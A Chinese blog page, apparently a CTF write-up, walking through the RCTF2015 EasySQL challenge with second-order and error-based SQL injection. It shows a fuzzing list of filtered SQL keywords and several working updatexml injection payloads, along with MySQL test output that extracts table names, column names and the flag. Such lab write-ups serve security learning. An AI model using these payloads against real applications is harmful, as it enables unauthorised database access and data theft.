@@ -1,0 +1,236 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RCTF2015EasySQL - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="考点：一个SQL注入，二次注入+报错注入
+当我们注册用户修改密码的时候便会触发
+我们可以测试一下被过滤了什么：
+1234567891011121314151617181920212223242526,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">RCTF2015EasySQL</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">RCTF2015EasySQL</h1>
+        <div class="stuff">
+            <span>十一月 18, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/BUU/" rel="tag">BUU</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h1><p>一个SQL注入，二次注入+报错注入</p>
+<p>当我们注册用户修改密码的时候便会触发</p>
+<p>我们可以测试一下被过滤了什么：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">length </span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">select </span><br><span class="line">sleep</span><br><span class="line">database</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">as</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">left</span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">join</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">\</span><br><span class="line">handler</span><br><span class="line">-- -</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">BY</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">COUNT</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">length</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">ascii</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">&#x27;</span><br><span class="line">union</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接用别人的字典来查一下</p>
+<p>大概对我们注入有影响的只有空格，select的话我们可以用大小写的方式进行绕过，于是去mysql里面尝试构造出语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br></pre></td></tr></table></figure>
+
+<p>得到注入语句：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))#</span><br><span class="line">#XPATH syntax error: &#x27;~web_sqli&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库的名字.</p>
+<p>下一步获取表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))#</span><br></pre></td></tr></table></figure>
+
+<p>这样的话会报错，Subquery returns more than 1 row，因为不止一个表，那我们添加group_concat函数</p>
+<p>在mysql中测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<p>得到表名：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~article,flag,users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里提前剧透一下，flag表的东西是假flag，纯粹作者搞心态的，我一直觉得这种东西很多余好吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;</span><br><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br></pre></td></tr></table></figure>
+
+<p>得到字段名：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里其实我们就可以发现一个不方便的地方了，报错注入的回显是有限的，所以这里后面应该是here，却没有显示出来</p>
+<p>注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))#</span><br></pre></td></tr></table></figure>
+
+<p>得到的东西很奇怪：</p>
+<p>~xxxx,xxx,xxx什么的，这就很恶心人了，于是我们尝试用正则表达式来匹配我们需要的数据</p>
+<p>别人的语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到前半段的flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这样的话还是不够，我们应该获取全部的数据，于是继续构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    11</span><br><span class="line">Current database: webos</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<p>因为Markdown自动的弱智不全，导致我fuzz了巨他妈久</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20201118221117122.png" alt="image-20201118221117122"></p>
+<p>得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">考点：</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
